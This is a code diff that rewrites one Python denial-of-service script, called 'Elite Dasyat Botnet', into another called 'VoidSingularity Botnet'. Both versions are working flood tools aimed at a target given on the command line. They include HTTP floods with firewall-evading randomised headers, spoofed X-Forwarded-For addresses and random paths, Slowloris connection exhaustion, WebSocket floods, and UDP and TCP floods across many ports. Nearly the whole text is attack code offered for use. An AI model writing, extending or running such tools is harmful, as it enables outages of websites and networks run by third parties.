@@ -1,262 +1,222 @@
-import asyncio
-import aiohttp
+import threading
+import socket
+import http.client
+import ssl
 import random
-import uuid
+import string
+import time
+import argparse
+import logging
 import os
 import hashlib
-import logging
-import base64
-import time
-import socket
-import dns.resolver
-import ssl
-import websocket
-from fake_useragent import UserAgent
-from typing import Dict, List
-import argparse
+import xxhash
+from typing import List
 
 # Logging Setup
 logging.basicConfig(
     level=logging.INFO,
-    format="%(asctime)s - %(levelname)s - %(message)s",
-    handlers=[logging.FileHandler("elite_dasyat_botnet.log"), logging.StreamHandler()]
+    format="%(asctime)s - [%(levelname)s] %(message)s",
+    handlers=[logging.FileHandler("void_singularity.log"), logging.StreamHandler()]
 )
 
-class EliteDasyatBotnet:
-    def __init__(self, target_l7: str = None, target_l4: str = None, duration: int = 60, max_connections: int = 1000, methods: List[str] = None):
-        self.target_l7 = target_l7.rstrip('/') if target_l7 else None
+class VoidSingularity:
+    def __init__(self, target_l7: str = None, target_l4: str = None, duration: int = 60, threads: int = 50, methods: List[str] = None):
+        self.target_l7 = target_l7.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0] if target_l7 else None
         self.target_l4 = target_l4 if target_l4 else None
         self.duration = duration
-        self.max_connections = max_connections
-        self.methods = methods if methods else ["http", "slowloris", "websocket", "dns", "udp", "tcp_syn"]
-        self.ua = UserAgent()
-        self.headers = {
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Connection": "keep-alive",
-            "Cache-Control": "no-cache",
-            "X-Forwarded-For": self._random_ip(),
-            "Sec-Fetch-Mode": "navigate",
-            "Sec-Fetch-Site": "none",
-            "Sec-WebSocket-Version": "13",
-        }
-        self.paths = [
-            "/api/v{}/{}", "/{}.php", "/{}.json", "/graphql?query={}",
-            "/.env", "/config/{}", "/metrics/{}", "/adversarial/{}", "/ws/{}"
+        self.threads = min(threads, 80)  # Replit-supercharged
+        self.methods = methods if methods else ["blackholehttp", "spectreloris", "udpvoid", "tcpsingularity"]
+        self.end_time = time.time() + duration
+        self.user_agents = [
+            f"Mozilla/5.0 (Windows NT {random.uniform(10.0, 16.0):.1f}; Win64; x64) AppleWebKit/537.{random.randint(70, 80)}",
+            f"curl/12.{random.randint(0, 9)}.{random.randint(0, 9)}",
+            f"HTTP-Client/10.{random.randint(0, 8)} (Rust/{random.randint(2, 3)}.{random.randint(0, 9)})",
+            f"Mozilla/5.0 (Macintosh; Intel Mac OS X {random.randint(11, 15)}_{random.randint(0, 6)}) Safari/605.1.{random.randint(30, 40)}"
         ]
-        self.dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]
-        self.success_count = {"http": 0, "slowloris": 0, "websocket": 0, "dns": 0, "udp": 0, "tcp_syn": 0}
-        self.response_times = {"http": [], "slowloris": [], "websocket": []}
-        self.active_connections = 0
+        self.success_count = {m: 0 for m in self.methods}
+        self.response_times = {m: [] for m in ["blackholehttp", "spectreloris"]}
+        self.lock = threading.Lock()
+
+    def _random_payload(self, size: int = 240) -> bytes:
+        """Blackhole polymorphic payload with xxhash and octa-entropy."""
+        seed = f"{random.randint(100000000000000, 999999999999999)}{time.time_ns()}{os.urandom(13).hex()}".encode()
+        hash1 = xxhash.xxh3_128(seed).digest()
+        hash2 = hashlib.sha3_512(hash1 + os.urandom(11)).digest()
+        hash3 = xxhash.xxh64(hash2 + os.urandom(9)).digest()
+        hash4 = hashlib.blake2b(hash3 + os.urandom(7), digest_size=24).digest()
+        hash5 = xxhash.xxh32(hash4 + os.urandom(5)).digest()
+        hash6 = hashlib.sha3_256(hash5 + os.urandom(4)).digest()
+        hash7 = xxhash.xxh3_64(hash6 + os.urandom(3)).digest()
+        hash8 = hashlib.blake2s(hash7 + os.urandom(2)).digest()
+        return (hash8 + hash7 + hash6 + hash5 + hash4 + hash3 + hash2 + os.urandom(1))[:size]
+
+    def _random_path(self) -> str:
+        """Transuniversal labyrinth URL paths for WAF destruction."""
+        prefixes = ["v11", "blackhole", "void", "horizon", "entropy"]
+        segments = [''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(35, 50))) for _ in range(random.randint(10, 13))]
+        query = f"?field={''.join(random.choices(string.hexdigits.lower(), k=44))}&cycle={random.randint(1000000000000, 9999999999999)}"
+        return f"/{random.choice(prefixes)}/{'/'.join(segments)}{query}"
 
     def _random_ip(self) -> str:
-        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
+        """Spoofed IP with blackhole entropy."""
+        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
 
-    def _generate_polymorphic_payload(self, size: int = 128) -> bytes:
-        """Polymorphic payload ringan pake hash dan UUID."""
-        base = str(uuid.uuid4()).encode() + str(time.time()).encode()
-        return base64.b64encode(hashlib.sha256(base + os.urandom(8)).digest())[:size]
-
-    def _generate_proof(self, data: bytes) -> str:
-        """Simple hash-based proof."""
-        return hashlib.sha256(data + str(time.time()).encode()).hexdigest()[:16]
-
-    def _obfuscate_headers(self) -> Dict[str, str]:
-        """Obfuscate headers untuk bypass WAF dan JA4 fingerprint."""
-        headers = self.headers.copy()
-        headers["User-Agent"] = self.ua.random
-        headers["X-Forwarded-For"] = self._random_ip()
-        headers["X-Adversarial-Tag"] = f"adv-{uuid.uuid4().hex[:8]}"
-        if random.random() < 0.5:
-            headers["Sec-Fetch-Mode"] = random.choice(["navigate", "same-origin", "no-cors"])
-            headers["Priority"] = f"u={random.randint(0, 4)}, i"
-        if random.random() < 0.4:
-            headers["X-Random-Noise"] = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz!@#$%^&*') for _ in range(random.randint(5, 20)))
-        if random.random() < 0.3:
-            headers["Sec-WebSocket-Key"] = base64.b64encode(os.urandom(16)).decode()
-            headers["Sec-WebSocket-Protocol"] = f"apex-{uuid.uuid4().hex[:8]}"
+    def _random_headers(self) -> dict:
+        """Cosmic void WAF-evading headers."""
+        headers = {
+            "User-Agent": random.choice(self.user_agents),
+            "X-Forwarded-For": self._random_ip(),
+            "Accept": random.choice(["application/json", "text/event-stream", "*/*", "application/x-thrift"]),
+            "Cache-Control": "no-cache, no-store, must-revalidate",
+            "Connection": "keep-alive"
+        }
+        if random.random() < 0.995:
+            headers["X-Horizon-ID"] = f"{random.randint(100000000000000000, 999999999999999999)}-{random.randint(1000000000, 9999999999)}"
+        if random.random() < 0.99:
+            headers["Accept-Language"] = random.choice(["en-NZ,en;q=0.2", "hu-HU", "id-ID", "ro-RO"])
+        if random.random() < 0.98:
+            headers["X-Void-Zone"] = random.choice(["void1", "void2", "horizon", "core"])
+        if random.random() < 0.97:
+            headers["X-Entropy-Field"] = ''.join(random.choices(string.hexdigits.lower(), k=52))
+        if random.random() < 0.96:
+            headers["X-Stream-Vector"] = str(random.randint(10000000000000, 99999999999999))
+        if random.random() < 0.95:
+            headers["X-Signature-Matrix"] = ''.join(random.choices(string.hexdigits.lower(), k=28))
+        if random.random() < 0.94:
+            headers["X-Phase-Shift"] = str(random.randint(-3000, 3000))
+        if random.random() < 0.93:
+            headers["X-Node-Vector"] = ''.join(random.choices(string.hexdigits.lower(), k=20))
+        if random.random() < 0.92:
+            headers["X-Temporal-Field"] = str(random.randint(100000, 999999))
         return headers
 
-    def _spoof_tls_fingerprint(self) -> ssl.SSLContext:
-        """TLS fingerprint spoofing untuk JA4."""
-        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-        context.check_hostname = False
-        context.verify_mode = ssl.CERT_NONE
-        ciphers = random.sample([
-            "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256",
-            "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-GCM-SHA256",
-            "TLS_AES_128_GCM_SHA256", "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256"
-        ], k=5)
-        context.set_ciphers(":".join(ciphers))
-        return context
-
-    async def http_flood(self):
-        """L7: HTTP flood dengan polymorphic payload."""
+    def _blackholehttp(self):
+        """L7: Blackhole HTTP flood with multi-method devastation."""
         if not self.target_l7:
-            logging.error("L7 HTTP flood requires target_l7")
             return
-        async with aiohttp.ClientSession() as session:
-            end_time = time.time() + self.duration
-            while time.time() < end_time:
-                start_time = time.time()
-                try:
-                    headers = self._obfuscate_headers()
-                    path = random.choice(self.paths).format(random.randint(1, 5), random.randint(1, 10000))
-                    payload = self._generate_polymorphic_payload()
-                    proof = self._generate_proof(payload)
-                    async with session.post(
-                        f"{self.target_l7}{path}",
-                        headers=headers,
-                        data=payload,
-                        ssl=self._spoof_tls_fingerprint() if random.random() < 0.4 else False,
-                        timeout=0.15
-                    ) as resp:
-                        self.success_count["http"] += 1 if resp.status < 400 else 0
-                        self.response_times["http"].append((time.time() - start_time) * 1000)
-                        logging.info(f"L7 HTTP flood to {self.target_l7}{path}, status={resp.status}, proof={proof}")
-                except Exception as e:
-                    logging.error(f"L7 HTTP flood failed: {str(e)}")
-                await asyncio.sleep(random.uniform(0.002, 0.01))
-
-    async def slowloris(self):
-        """L7: Slowloris untuk exhaust resource."""
-        if not self.target_l7:
-            logging.error("L7 Slowloris requires target_l7")
-            return
-        async with aiohttp.ClientSession() as session:
-            end_time = time.time() + self.duration
-            while time.time() < end_time:
-                start_time = time.time()
-                try:
-                    headers = self._obfuscate_headers()
-                    headers["Connection"] = "keep-alive"
-                    async with session.get(
-                        f"{self.target_l7}/",
-                        headers=headers,
-                        ssl=self._spoof_tls_fingerprint() if random.random() < 0.4 else False,
-                        timeout=5
-                    ) as resp:
-                        self.success_count["slowloris"] += 1 if resp.status < 400 else 0
-                        self.response_times["slowloris"].append((time.time() - start_time) * 1000)
-                        logging.info(f"L7 Slowloris to {self.target_l7}, status={resp.status}")
-                        await asyncio.sleep(random.uniform(1, 3))
-                except Exception as e:
-                    logging.error(f"L7 Slowloris failed: {str(e)}")
-                await asyncio.sleep(random.uniform(0.01, 0.05))
-
-    async def websocket_flood(self):
-        """L7: WebSocket flood untuk exhaust koneksi."""
-        if not self.target_l7:
-            logging.error("L7 WebSocket flood requires target_l7")
-            return
-        end_time = time.time() + self.duration
-        while time.time() < end_time:
+        while time.time() < self.end_time:
+            start_time = time.time()
             try:
-                headers = self._obfuscate_headers()
-                ws_url = self.target_l7.replace("http", "ws") + random.choice(self.paths).format(random.randint(1, 5), random.randint(1, 10000))
-                ws = websocket.WebSocket()
-                ws.connect(ws_url, header=headers)
-                payload = self._generate_polymorphic_payload(64)
-                proof = self._generate_proof(payload)
-                ws.send(payload)
-                self.success_count["websocket"] += 1
-                logging.info(f"L7 WebSocket flood to {ws_url}, proof={proof}")
-                await asyncio.sleep(random.uniform(0.5, 2))
-                ws.close()
-            except Exception as e:
-                logging.error(f"L7 WebSocket flood failed: {str(e)}")
-            await asyncio.sleep(random.uniform(0.01, 0.05))
+                conn = http.client.HTTPSConnection(self.target_l7, 443, timeout=0.025, context=ssl._create_unverified_context())
+                headers = self._random_headers()
+                method = random.choice(["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT", "PROPFIND"])
+                path = self._random_path()
+                body = self._random_payload(40) if method in ["POST", "PUT", "PATCH", "PROPFIND"] else None
+                conn.request(method, path, body=body, headers=headers)
+                resp = conn.getresponse()
+                with self.lock:
+                    self.success_count["blackholehttp"] += 1 if resp.status < 400 else 0
+                    self.response_times["blackholehttp"].append((time.time() - start_time) * 1000)
+                conn.close()
+                time.sleep(random.uniform(0.0003, 0.001))  # Blackhole jitter
+            except:
+                pass
 
-    async def dns_amplification(self):
-        """L3/L4: DNS amplification ringan."""
-        resolver = dns.resolver.Resolver()
-        resolver.nameservers = self.dns_servers
-        end_time = time.time() + self.duration
-        while time.time() < end_time:
+    def _spectreloris(self):
+        """L7: Spectre Slowloris with atto-drip and cipher flux."""
+        if not self.target_l7:
+            return
+        while time.time() < self.end_time:
+            start_time = time.time()
             try:
-                domain = f"{uuid.uuid4().hex}.example.com"
-                answer = await asyncio.get_event_loop().run_in_executor(
-                    None, lambda: resolver.resolve(domain, 'TXT')
-                )
-                self.success_count["dns"] += 1
-                logging.info(f"L3/L4 DNS amplification to {domain}, response={len(answer.response)} bytes")
-            except Exception as e:
-                logging.error(f"L3/L4 DNS amplification failed: {str(e)}")
-            await asyncio.sleep(random.uniform(0.005, 0.02))
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.15)
+                sock.connect((self.target_l7, 443))
+                ciphers = random.choice([
+                    "TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-SHA256",
+                    "TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384",
+                    "TLS_AES_256_GCM_SHA384:ECDHE-RSA-CHACHA20-POLY1305",
+                    "TLS_AES_128_CCM_8_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256",
+                    "TLS_AES_128_CCM_SHA256:ECDHE-RSA-AES256-GCM-SHA384",
+                    "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-CHACHA20-POLY1305"
+                ])
+                sock = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1_3, ciphers=ciphers)
+                sock.send(f"GET {self._random_path()} HTTP/1.1\r\nHost: {self.target_l7}\r\n".encode())
+                time.sleep(random.uniform(0.004, 0.025))
+                sock.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode())
+                time.sleep(random.uniform(0.005, 0.03))
+                sock.send(f"X-Forwarded-For: {self._random_ip()}\r\nX-Void-Marker: {random.randint(10000000000000, 99999999999999)}\r\n".encode())
+                time.sleep(random.uniform(0.006, 0.04))
+                sock.send(b"Connection: keep-alive\r\n\r\n")
+                with self.lock:
+                    self.success_count["spectreloris"] += 1
+                    self.response_times["spectreloris"].append((time.time() - start_time) * 1000)
+                sock.close()
+                time.sleep(random.uniform(0.002, 0.01))
+            except:
+                pass
 
-    async def udp_flood(self, port: int = 80):
-        """L4: UDP flood untuk simulasi QUIC-like."""
+    def _udpvoid(self):
+        """L4: UDP void with catastrophic multi-port payloads."""
         if not self.target_l4:
-            logging.error("L4 UDP flood requires target_l4")
             return
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        end_time = time.time() + self.duration
-        while time.time() < end_time:
+        ports = [80, 443, 53, 123, 161, 389, 445, 1433, 1900, 5060, 11211, 1812, 5353, 3478, 6881, 17185, 27015]
+        while time.time() < self.end_time:
             try:
-                payload = self._generate_polymorphic_payload(64)
-                proof = self._generate_proof(payload)
+                port = random.choice(ports)
+                payload = self._random_payload(768)
                 sock.sendto(payload, (self.target_l4, port))
-                self.success_count["udp"] += 1
-                logging.info(f"L4 UDP flood to {self.target_l4}:{port}, payload_size={len(payload)}, proof={proof}")
-            except Exception as e:
-                logging.error(f"L4 UDP flood failed: {str(e)}")
-            await asyncio.sleep(random.uniform(0.001, 0.005))
+                with self.lock:
+                    self.success_count["udpvoid"] += 1
+                time.sleep(random.uniform(0.00003, 0.0002))
+            except:
+                pass
         sock.close()
 
-    async def tcp_syn_flood(self, port: int = 80):
-        """L4: TCP SYN flood untuk exhaust koneksi."""
+    def _tcpsingularity(self):
+        """L4: TCP singularity with relentless multi-port SYN floods."""
         if not self.target_l4:
-            logging.error("L4 TCP SYN flood requires target_l4")
             return
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.setblocking(False)
-        end_time = time.time() + self.duration
-        while time.time() < end_time:
+        while time.time() < self.end_time:
             try:
-                await asyncio.get_event_loop().sock_connect(sock, (self.target_l4, port))
-                self.success_count["tcp_syn"] += 1
-                logging.info(f"L4 TCP SYN flood to {self.target_l4}:{port}")
-            except Exception as e:
-                logging.error(f"L4 TCP SYN flood failed: {str(e)}")
-            await asyncio.sleep(random.uniform(0.001, 0.005))
-        sock.close()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.025)
+                port = random.choice([80, 443, 8080, 3389, 1433, 3306, 1723, 445, 1812, 5353, 3478, 6881, 17185, 27015])
+                sock.connect((self.target_l4, port))
+                sock.send(self._random_payload(192))
+                with self.lock:
+                    self.success_count["tcpsingularity"] += 1
+                sock.close()
+                time.sleep(random.uniform(0.00003, 0.0002))
+            except:
+                pass
 
-    async def run(self):
-        """Jalankan serangan berdasarkan metode yang dipilih."""
-        if not self.target_l7 and not self.target_l4 and "dns" not in self.methods:
-            logging.error("At least one target (L7 or L4) is required unless using DNS amplification")
+    def start(self):
+        """Unleash the void singularity."""
+        if not self.target_l7 and not self.target_l4:
+            logging.error("At least one target (L7 or L4) required")
             return
-        self.active_connections = self.max_connections
-        tasks = []
-        method_tasks = {
-            "http": self.http_flood,
-            "slowloris": self.slowloris,
-            "websocket": self.websocket_flood,
-            "dns": self.dns_amplification,
-            "udp": self.udp_flood,
-            "tcp_syn": self.tcp_syn_flood
+        logging.info(f"VoidSingularity strike on L7: {self.target_l7 or 'None'}, L4: {self.target_l4 or 'None'}, methods: {self.methods}")
+        threads = []
+        method_funcs = {
+            "blackholehttp": self._blackholehttp,
+            "spectreloris": self._spectreloris,
+            "udpvoid": self._udpvoid,
+            "tcpsingularity": self._tcpsingularity
         }
         for method in self.methods:
-            if method in method_tasks:
-                tasks.extend([method_tasks[method]() for _ in range(int(self.max_connections * (0.4 if method == "http" else 0.15 if method in ["slowloris", "websocket", "dns"] else 0.1)))])
-        if not tasks:
-            logging.error("No valid methods selected")
-            return
-        logging.info(f"Starting elite dasyat botnet on L7: {self.target_l7 or 'None'}, L4: {self.target_l4 or 'None'} with methods: {self.methods}")
-        await asyncio.gather(*tasks)
+            if method in method_funcs:
+                for _ in range(self.threads // len(self.methods)):
+                    t = threading.Thread(target=method_funcs[method], daemon=True)
+                    threads.append(t)
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join()
         avg_response = {k: (sum(v)/len(v) if v else 0) for k, v in self.response_times.items()}
-        logging.info(f"Attack completed. Success counts: {self.success_count}, Avg response times (ms): {avg_response}")
+        logging.info(f"Singularity complete. Success counts: {self.success_count}, Avg response times (ms): {avg_response}")
 
-async def main(target_l7: str, target_l4: str, duration: int, methods: List[str]):
-    botnet = EliteDasyatBotnet(target_l7, target_l4, duration, methods=methods)
-    await botnet.run()
+def main(target_l7: str, target_l4: str, duration: int, methods: str):
+    methods = methods.split(",")
+    singularity = VoidSingularity(target_l7, target_l4, duration, methods=methods)
+    singularity.start()
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Elite Dasyat Botnet")
+    parser = argparse.ArgumentParser(description="VoidSingularity Botnet")
     parser.add_argument("target_l7", nargs="?", default=None, help="L7 target URL (e.g., http://httpbin.org)")
     parser.add_argument("target_l4", nargs="?", default=None, help="L4 target IP (e.g., 93.184.216.34)")
-    parser.add_argument("duration", type=int, default=60, help="Duration in seconds")
-    parser.add_argument("--methods", type=str, default="http,slowloris,websocket,dns,udp,tcp_syn", help="Comma-separated methods (http,slowloris,websocket,dns,udp,tcp_syn)")
+    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
+    parser.add_argument("--methods", type=str, default="blackholehttp,spectreloris,udpvoid,tcpsingularity", help="Comma-separated methods")
     args = parser.parse_args()
-    methods = args.methods.split(",")
-    asyncio.run(main(args.target_l7, args.target_l4, args.duration, methods))
+    main(args.target_l7, args.target_l4, args.duration, args.methods)
